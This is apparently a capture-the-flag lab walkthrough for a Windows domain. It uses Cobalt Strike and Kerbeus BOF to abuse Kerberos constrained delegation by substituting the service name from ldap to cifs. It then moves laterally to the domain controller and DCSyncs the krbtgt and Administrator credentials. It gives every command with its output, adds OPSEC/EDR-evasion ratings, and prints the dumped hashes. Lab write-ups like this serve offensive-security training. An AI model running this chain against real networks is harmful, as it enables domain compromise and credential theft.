# Kerberos Challenge  

> **Objective:** Identify and exploit a Kerberos misconfiguration to move laterally to `lon-dc-1` and list the contents of `C$` on the domain controller.

> **Technique:** Constrained delegation with **service name substitution** (`ldap` → `cifs`). `LON-WKSTN-1$` is delegated to `ldap/lon-dc-1` — no CIFS in the delegation list.  
> By substituting the service class in the unencrypted ticket header, the CIFS ticket is accepted by the target because the DC only validates the encrypted PAC, not the SPN prefix.  

>This challenge uses `ldap/lon-dc-1` → `cifs/lon-dc-1` against the domain controller itself.  

---

## Prerequisites

Load the Kerbeus BOF aggressor script before running any `krb_*` commands:

```
Cobalt Strike → Script Manager → Load → C:\Tools\Kerbeus-BOF\kerbeus_cs.cna
```

> OPSEC-🟢SAFE — BOF-based Kerberos operations run in beacon thread with no child process spawn.

<img src="/images/kerberos-challenge01.png" width=860>

> Two beacons on LON-WKSTN-1 — `pchilds` (user) and `SYSTEM*` (machine). Kerbeus-BOF script visible in Script Manager.  
> The SYSTEM beacon is required to access LUID `0x3e7`.  

----

## Step 1 — Enumerate existing Kerberos tickets

From the beacon running as SYSTEM on `lon-wkstn-1`:

```cs
krb_triage
```

krb_triage output — machine account logon sessions present:

```
| LUID    | Client               | Service                               | End Time            |
|---------|----------------------|---------------------------------------|---------------------|
| 0:0x3e7 | lon-wkstn-1$ @ CONTOSO.COM | krbtgt/CONTOSO.COM              | 13.04.2026 06:06:12 |
| 0:0x3e7 | lon-wkstn-1$ @ CONTOSO.COM | LDAP/lon-dc-1.contoso.com       | 13.04.2026 06:06:12 |
| 0:0x3e7 | lon-wkstn-1$ @ CONTOSO.COM | cifs/lon-dc-1.contoso.com/contoso.com | 13.04.2026 06:06:12 |
```

LUID `0x3e7` is the **machine account SYSTEM logon session** — always present on any domain-joined host.

<img src="/images/kerberos-challenge02.png" width=860>

> `krb_triage` output showing LUID `0x3e7` (LON-WKSTN-1$ machine account) tickets. Also visible: first `ldapsearch` run with `userAccountControl` filter finding `LON-DC-1$`.

---

## Step 2 — Enumerate constrained delegation configuration

```cs
ldapsearch (&(samAccountType=805306369)(msDS-AllowedToDelegateTo=*)) --attributes samAccountName,msDS-AllowedToDelegateTo,userAccountControl
```

ldapsearch Output:

```
userAccountControl: 16781312
sAMAccountName: LON-WKSTN-1$
msDS-AllowedToDelegateTo: ldap/lon-dc-1.contoso.com, ldap/lon-dc-1
retreived 1 results total
```

> OPSEC-🟢SAFE — BOF ldapsearch, runs in beacon thread, no child process.

**Finding:** `LON-WKSTN-1$` has constrained delegation configured for `ldap/lon-dc-1.contoso.com` — **LDAP only, no CIFS**. This is the misconfiguration. The service class `ldap` can be substituted with `cifs` in the ticket header because the target DC only validates the encrypted portion.

`userAccountControl: 16781312` = `TRUSTED_TO_AUTH_FOR_DELEGATION` flag set (S4U2self enabled without requiring a password).

<img src="/images/kerberos-challenge03.png" width=860>

> `ldapsearch` with `msDS-AllowedToDelegateTo=*` filter — confirms `LON-WKSTN-1$` is delegated to `ldap/lon-dc-1.contoso.com, ldap/lon-dc-1`. No CIFS entry — this is the misconfiguration to exploit.

---

## Step 3 — Dump the machine account TGT

```cs
krb_dump /luid:3e7 /service:krbtgt
```

Output (truncated):

```
UserName        : LON-WKSTN-1$
Domain          : CONTOSO
LogonId         : 0:0x3e7
UserSID         : S-1-5-18
Authentication  : Negotiate

  [0] Forwarded TGT
    ClientName  : lon-wkstn-1$ @ CONTOSO.COM
    ServiceRealm: krbtgt/CONTOSO.COM @ CONTOSO.COM
    Flags       : forwardable forwarded renewable pre_authent enc_pa_rep
    KeyType     : aes256_cts_hmac_sha1

    doIFrDCCBaigAwIBBaEDAg<snip>AgECoRcwFRsGa3JidGd0GwtDT05UT1NPLkNPTQ==
```

OPSEC-🟠CAUTION — BOF, no child process. Uses `LsaCallAuthenticationPackage` Kerberos API — EDR hooks on this API will fire. Does not touch LSASS memory directly.

Copy the full base64 TGT string (ticket index `[0]` — the forwarded, forwardable ticket). Used in the next step.

---

## Step 4 — S4U abuse with service name substitution

Use the machine TGT to perform S4U2proxy for the delegated SPN (`ldap/lon-dc-1`), then substitute the service class to `cifs`:

```cs
krb_s4u /ticket:doIFrDCCBaigAwIBBaEDAgEWoo <snip> d0GwtDT05UT1NPLkNPTQ== /service:ldap/lon-dc-1 /altservice:cifs /impersonateuser:Administrator
```

krb_s4u Output:

```
[*] Action: S4U

[*] Building S4U2self request for: 'LON-WKSTN-1$@CONTOSO.COM'
[+] S4U2self success!
[*] Got a TGS for 'Administrator' to 'LON-WKSTN-1$@CONTOSO.COM'

[*] Impersonating user 'Administrator' to target SPN 'ldap/lon-dc-1'
[*]   Final ticket will be for the alternate service 'cifs'
[*] Building S4U2proxy request for service: 'ldap/lon-dc-1'
[+] S4U2proxy success!
[*] Substituting alternative service name 'cifs'
[*] base64(ticket.kirbi) for SPN 'cifs/lon-dc-1':

doIGhDCCBoCgAwIBBaED <snip> hEjAQGwRjaWZzGwhsb24tZGMtMQ==
```

> OPSEC-🟢SAFE — `krb_s4u` is a BOF. Runs in beacon thread, no child process, no disk write on target.

## Step 5 — Save the service ticket to disk (attacker machine only)

Run this in a **local PowerShell terminal on the attacker desktop** (not via beacon):

```powershell
[IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\cifs-lon-dc-1.kirbi", [Convert]::FromBase64String("doIGhDCCBoCgAwIBBaEDAgEWooIFnDCC<snip>QGwRjaWZzGwhsb24tZGMtMQ=="))
```

<img src="/images/kerberos-challenge05.png" width=860>

> CS beacon showing full `krb_s4u` flow: S4U2self TGS for Administrator → S4U2proxy for `ldap/lon-dc-1` → service name substituted to `cifs` → base64 ticket output. Immediately followed by `make_token CONTOSO\Administrator FakePass` (netonly) and `kerberos_ticket_use` injecting the kirbi.

**`/altservice:cifs`** Replaces the service class in the unencrypted EncTicketPart header. The KDC-signed encrypted PAC is unchanged. The target host validates only the encrypted portion and accepts the substituted ticket.

Copy the full base64 output for SPN `cifs/lon-dc-1`.


<img src="/images/kerberos-challenge04.png">

> PowerShell terminal showing the TGT ticket flags (`forwardable, forwarded, pre_authent, renewable`) confirming the ticket is usable for delegation, and the `WriteAllBytes` command saving the base64 service ticket to `.kirbi` on the attacker desktop.

---

## Step 6 — Inject ticket and access the share

Back in the beacon on `lon-wkstn-1`:

>`.kirbi` file is written to the attacker desktop only — nothing is written to the target DC. `kerberos_ticket_use` reads the file from the CS client and injects it over the C2 channel.  

```cs
make_token CONTOSO\Administrator FakePass
kerberos_ticket_use C:\Users\Attacker\Desktop\cifs-lon-dc-1.kirbi
ls \\lon-dc-1\c$
```

>File list Output:  

```
 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     01/24/2025 13:33:39   $Recycle.Bin
          dir     01/23/2025 13:57:51   $WinREAgent
          dir     01/23/2025 13:47:37   Documents and Settings
          dir     05/08/2021 09:20:24   PerfLogs
          dir     04/11/2025 13:01:00   Program Files
<snip>
          dir     01/24/2025 13:33:21   Users
          dir     04/11/2025 11:54:00   Windows
 12kb     fil     04/12/2026 14:05:24   DumpStack.log.tmp
 1gb      fil     04/12/2026 14:05:24   pagefile.sys
```

> OPSEC-🟢SAFE — `make_token` creates a sacrificial logon session in beacon memory.  
> `kerberos_ticket_use` injects the ticket into that session — no disk write on target, no child process.  

## Lateral Movement to DC

```
ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
jump scshell64 lon-dc-1 smb
```

>beacon jump output:  

```
[04/28 10:08:05] [+] host called home, sent: 396130 bytes
[04/28 10:08:31] [+] received output:
Trying to connect to lon-dc-1

[04/28 10:08:31] [+] received output:
SC_HANDLE Manager 0x00000211C48A66C0

[04/28 10:08:31] [+] received output:
Opening defragsvc

[04/28 10:08:31] [+] received output:
SC_HANDLE Service 0x00000211C48A60A0
<snip>

[04/28 10:08:31] [+] established link to child beacon: 10.10.120.1
```

## LON-DC-1 Beacon SYSTEM - 10.10.120.1

```
cd c:\users
cd Administrator
ls
getuid
ipconfig
```

>ipconfig output:  
```
received output:
{786FFF21-9572-488C-94B9-FD396C9802A4}
	Ethernet
	Microsoft Hyper-V Network Adapter
	02-15-5D-18-5F-C0
	10.10.120.1
Hostname: 	lon-dc-1
DNS Suffix: 	contoso.com
DNS Server: 	127.0.0.1
```

## DCSync on DC

```
dcsync contoso.com CONTOSO\krbtgt
```

dcsync output krbtgt:

```
** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   : 
Password last change : 24/01/2025 14:50:53
Object Security ID   : S-1-5-21-3926355307-1661546229-813047887-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: 2d454c2120b54890b3db65406e5a5974
    ntlm- 0: 2d454c2120b54890b3db65406e5a5974
    lm  - 0: 6666c48c4b440676cfda7be586409948
```

<img src="/images/kerberos_challenge_extra.png">  

```
dcsync contoso.com CONTOSO\Administrator
```

Output dcsync admin

```
** SAM ACCOUNT **

SAM Username         : Administrator
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   : 01/01/1601 01:00:00
Password last change : 24/01/2025 14:33:09
Object Security ID   : S-1-5-21-3926355307-1661546229-813047887-500
Object Relative ID   : 500

Credentials:
  Hash NTLM: fc525c9683e8fe067095ba2ddc971889
```

## End

```                                   
1. Clean up impersonation on LON-WKSTN-1
beacon> rev2self

2. Confirm krbtgt hash is saved — already in your log, but note these key values:

  krbtgt  AES256: 512920012661247c674784eef6e1b3ba52f64f28f57cf2b3f67246f20e6c722c
  krbtgt  NTLM:   2d454c2120b54890b3db65406e5a5974

  Admin   AES256: 0b4a6bc13049439c555b145635f4837e5a866005a3b032d4b6fe42bd1db49886
  Admin   NTLM:   fc525c9683e8fe067095ba2ddc971889

3. LON-CS-1 for next lab session — that's the ADCS Certificate Authority. ESC attacks (ESC1, ESC8 coerce relay) are a separate lab topic but now you have the full DA context to attack.
```

>Lab objective: COMPLETE. Constrained delegation abuse → SYSTEM on LON-DC-1 → DCSync krbtgt. Full kill chain and extra.  

